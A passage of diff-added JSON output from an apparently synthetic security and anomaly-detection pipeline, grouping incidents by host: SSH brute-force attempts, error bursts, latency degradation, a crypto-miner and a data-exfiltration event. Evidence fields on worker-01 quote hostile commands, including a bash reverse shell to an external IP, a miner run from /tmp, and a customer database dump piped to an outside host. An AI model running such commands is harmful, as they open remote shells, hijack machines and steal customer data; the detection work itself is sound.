+        "timestamp":"2026-01-16T10:15:10.444064+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"25 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user pi from 203.0.113.100 port 62444 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:10.679239+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"26 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user git from 203.0.113.100 port 44000 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:10.765404+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"27 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user deploy from 203.0.113.100 port 32462 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:11.356919+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"28 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user pi from 203.0.113.100 port 46636 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:11.959432+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"29 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user ubuntu from 203.0.113.100 port 60282 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:12.114701+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"30 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user ubuntu from 203.0.113.100 port 50646 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:12.307046+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"31 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user deploy from 203.0.113.100 port 56142 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:12.974443+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"32 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 42512 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:13.210445+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"33 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 52754 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:13.300300+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"34 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 48714 ssh2",
+        "source_ip":"203.0.113.100"
+      }
+    ]
+  },
+  {
+    "key":"web-02:error_burst:20260116T1055",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-16T10:55:00+00:00",
+    "end":"2026-01-16T11:45:00+00:00",
+    "peak_score":5.5316,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"error_burst",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":37.29
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":6.23
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":-1.57
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.47
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:suspicious_process:20260116T1232",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-16T12:32:00+00:00",
+    "end":"2026-01-16T13:15:00+00:00",
+    "peak_score":1.7925,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"suspicious_process",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"cpu_pct",
+        "z":5.37
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":4.36
+      },
+      {
+        "metric":"process_count",
+        "z":1.26
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.74
+      }
+    ],
+    "findings":[
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:32:30.767289+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:32:30.767289+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:33:25.835356+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:33:25.835356+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:34:08.248069+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:40458 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:35:21.468389+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:56219 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:36:34.390535+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:54850 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:36:40.205159+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:36:40.205159+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:37:09.657989+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"bash -i >& \/dev\/tcp\/198.51.100.21\/4444 0>&1\"",
+        "source_ip":"198.51.100.21"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:37:36.264360+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:37:36.264360+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:38:00.224424+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:38:00.224424+00:00",
+        "rule_id":"PROC-002",
+        "incident_type":"suspicious_process",
+        "severity":"critical",
+        "description":"Execution from \/tmp or reverse shell",
+        "evidence":"type=EXECVE uid=www-data cmd=\"\/tmp\/.cache\/kworkerds --url stratum+tcp:\/\/pool.mining.example:3333 --threads 8\"",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:38:46.803908+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:42588 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:42:08.593633+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:54885 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:44:34.962189+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:54780 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:45:15.033622+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:50183 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:46:29.350028+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:48786 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T12:47:21.626779+00:00",
+        "rule_id":"PROC-001",
+        "incident_type":"suspicious_process",
+        "severity":"high",
+        "description":"Crypto-mining pool connection",
+        "evidence":"ESTABLISHED 10.0.1.15:55473 -> 198.51.100.21:3333 proto=tcp process=kworkerds",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"web-02:ssh_brute_force:20260116T1312",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-16T13:12:00+00:00",
+    "end":"2026-01-16T13:27:00+00:00",
+    "peak_score":6.8202,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"ssh_brute_force",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":36.67
+      },
+      {
+        "metric":"process_count",
+        "z":3.35
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.69
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.14
+      }
+    ],
+    "findings":[
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:07.029716+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"15 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user git from 198.51.100.246 port 63502 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:07.259065+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"16 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 63531 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:08.794914+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"17 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user pi from 198.51.100.246 port 40734 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.085358+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"18 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 45658 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.093292+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"19 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user root from 198.51.100.246 port 34178 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.107212+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"20 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 198.51.100.246 port 38824 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.404807+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"21 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user ubuntu from 198.51.100.246 port 42171 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.544706+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"22 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 198.51.100.246 port 45869 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.631929+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"23 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user git from 198.51.100.246 port 38292 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:09.726528+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"24 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 198.51.100.246 port 56759 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:10.454909+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"25 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 42729 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:10.610364+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"26 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user ubuntu from 198.51.100.246 port 35569 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:10.913770+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"27 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 61793 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.233242+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"28 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 39433 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.412788+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"29 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user root from 198.51.100.246 port 54642 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.461831+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"30 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user admin from 198.51.100.246 port 36676 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.641649+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"31 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user git from 198.51.100.246 port 49691 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.701081+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"32 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user root from 198.51.100.246 port 60568 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:11.812198+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"33 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for root from 198.51.100.246 port 62646 ssh2",
+        "source_ip":"198.51.100.246"
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T13:12:12.394767+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"34 failed SSH logins from 198.51.100.246 in 5 min",
+        "evidence":"Failed password for invalid user test from 198.51.100.246 port 34769 ssh2",
+        "source_ip":"198.51.100.246"
+      }
+    ]
+  },
+  {
+    "key":"db-01:latency_degradation:20260116T1340",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-16T13:40:00+00:00",
+    "end":"2026-01-16T14:05:00+00:00",
+    "peak_score":2.5156,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":8.13
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":4.14
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.89
+      },
+      {
+        "metric":"mem_pct",
+        "z":-0.8
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:error_burst:20260116T1404",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-16T14:04:00+00:00",
+    "end":"2026-01-16T14:22:00+00:00",
+    "peak_score":6.2527,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"error_burst",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"error_rate_pct",
+        "z":41.62
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":4.28
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.99
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.96
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"worker-01:data_exfiltration:20260116T1428",
+    "host":"worker-01",
+    "role":"worker",
+    "start":"2026-01-16T14:28:00+00:00",
+    "end":"2026-01-16T14:51:00+00:00",
+    "peak_score":6.0853,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":41.41
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":2.17
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.19
+      },
+      {
+        "metric":"mem_pct",
+        "z":1.17
+      }
+    ],
+    "findings":[
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:28:32.062179+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:198.51.100.28\/drop\/customers.dump\"",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:29:48.746938+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:198.51.100.28\/drop\/customers.dump\"",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:29:48.860132+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1214 MB sent to external 198.51.100.28:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:49946 -> 198.51.100.28:8443 proto=tcp bytes_out=1214000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:30:37.252542+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1223 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:50177 -> 198.51.100.28:21 proto=tcp bytes_out=1223000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:30:45.870293+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1499 MB sent to external 198.51.100.28:443",
+        "evidence":"ESTABLISHED 10.0.1.15:47584 -> 198.51.100.28:443 proto=tcp bytes_out=1499000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:30:57.746974+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1435 MB sent to external 198.51.100.28:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:41628 -> 198.51.100.28:4444 proto=tcp bytes_out=1435000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:31:02.105170+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1750 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:52342 -> 198.51.100.28:21 proto=tcp bytes_out=1750000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:31:02.720466+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1262 MB sent to external 198.51.100.28:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:43366 -> 198.51.100.28:8443 proto=tcp bytes_out=1262000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:31:51.930385+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1602 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:49551 -> 198.51.100.28:21 proto=tcp bytes_out=1602000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:32:28.530315+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1288 MB sent to external 198.51.100.28:443",
+        "evidence":"ESTABLISHED 10.0.1.15:55493 -> 198.51.100.28:443 proto=tcp bytes_out=1288000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:32:47.794490+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1774 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:42090 -> 198.51.100.28:21 proto=tcp bytes_out=1774000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:33:41.070609+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1385 MB sent to external 198.51.100.28:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:56047 -> 198.51.100.28:4444 proto=tcp bytes_out=1385000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:33:43.741488+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1570 MB sent to external 198.51.100.28:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:54282 -> 198.51.100.28:4444 proto=tcp bytes_out=1570000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:33:58.615224+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"930 MB sent to external 198.51.100.28:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:56478 -> 198.51.100.28:8443 proto=tcp bytes_out=930000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:34:04.912971+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1744 MB sent to external 198.51.100.28:21",
+        "evidence":"ESTABLISHED 10.0.1.15:40727 -> 198.51.100.28:21 proto=tcp bytes_out=1744000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:34:29.570886+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"967 MB sent to external 198.51.100.28:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:46305 -> 198.51.100.28:4444 proto=tcp bytes_out=967000000 process=rclone",
+        "source_ip":"198.51.100.28"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-16T14:34:58.253258+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1153 MB sent to external 198.51.100.28:21",
